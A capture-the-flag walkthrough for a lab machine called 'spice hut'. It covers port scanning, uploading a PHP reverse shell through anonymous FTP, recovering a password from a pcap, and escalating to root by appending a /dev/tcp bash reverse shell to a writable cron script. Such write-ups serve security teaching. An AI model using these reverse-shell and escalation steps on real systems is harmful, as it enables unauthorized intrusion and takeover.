@@ -1,0 +1,69 @@
+spice hut
+
+1) Recipe
+	port scanning: nmap -sC -sV 10.10.159.137 -v , rustscan -a 10.10.159.137 --ulimit 1000 -- -sC -sV -A -Pn
+	PORT   STATE SERVICE REASON  VERSION
+	21/tcp open  ftp     syn-ack vsftpd 3.0.3
+	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+	| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
+	| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
+	|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
+	| ftp-syst: 
+	|   STAT: 
+	| FTP server status:
+	|      Connected to 10.8.20.224
+	|      Logged in as ftp
+	|      TYPE: ASCII
+	|      No session bandwidth limit
+	|      Session timeout in seconds is 300
+	|      Control connection is plain text
+	|      Data connections will be plain text
+	|      At session startup, client count was 3
+	|      vsFTPd 3.0.3 - secure, fast, stable
+	|_End of status
+	22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 b9a60b841d2201a401304843612bab94 (RSA)
+	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAzds8QxN5Q2TsERsJ98huSiuasmToUDi9JYWVegfTMV4Fn7t6/2ENm/9uYblUv+pLBnYeGo3XQGV23foZIIVMlLaC6ulYwuDOxy6KtHauVMlPRvYQd77xSCUqcM1ov9d00Y2y5eb7S6E7zIQCGFhm/jj5ui6bcr6wAIYtfpJ8UXnlHg5f/mJgwwAteQoUtxVgQWPsmfcmWvhreJ0/BF0kZJqi6uJUfOZHoUm4woJ15UYioryT6ZIw/ORL6l/LXy2RlhySNWi6P9y8UXrgKdViIlNCun7Cz80Cfc16za/8cdlthD1czxm4m5hSVwYYQK3C7mDZ0/jung0/AJzl48X1
+	|   256 ec13258c182036e6ce910e1626eba2be (ECDSA)
+	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOKJ0cuq3nTYxoHlMcS3xvNisI5sKawbZHhAamhgDZTM989wIUonhYU19Jty5+fUoJKbaPIEBeMmA32XhHy+Y+E=
+	|   256 a2ff2a7281aaa29f55a4dc9223e6b43f (ED25519)
+	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPnFr/4W5WTyh9XBSykso6eSO6tE0Aio3gWM8Zdsckwo
+	80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+	|_http-title: Maintenance
+	| http-methods: 
+	|_  Supported Methods: OPTIONS GET HEAD POST
+	|_http-server-header: Apache/2.4.18 (Ubuntu)
+	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+	ftp , anonymous - success , now get notice.txt and important.jpg and do strings for jpg file
+	now trying put with dummy txt, it worked
+
+	* generate php reversel shell - https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+	* put this file and execute you got shell
+	* found the recipe flag
+
+2) user
+	so, hard to work in shell
+	python -c 'import pty;pty.spawn("/bin/bash")' -> bash will execute to work
+	* check incident folder got suspicious.pcapng file, okay we need to download
+	* python3 -m http.server , server started
+	* browser http://machine_ip:8000/
+	* locate the file suspicious.pcapng and download it
+	* open the file with wireshark -> check TCP 4444 -> 40934 [PSH,ACK] -> follow tcp stream
+	* ssh lennie@machine_ip with password
+	* found user flag
+
+3) Root
+	* check scripts folder
+	* cd scripts/ -> cat planner.sh
+	* cat /etc/print.sh
+	* ls -la /etc/print.sh
+	* vi /etc/print.sh
+		append this line:
+		export RHOST=10.8.20.224
+		export RPORT=12345
+		bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
+	* nc -lvnp 12345 on host
+	* found root flag
+	
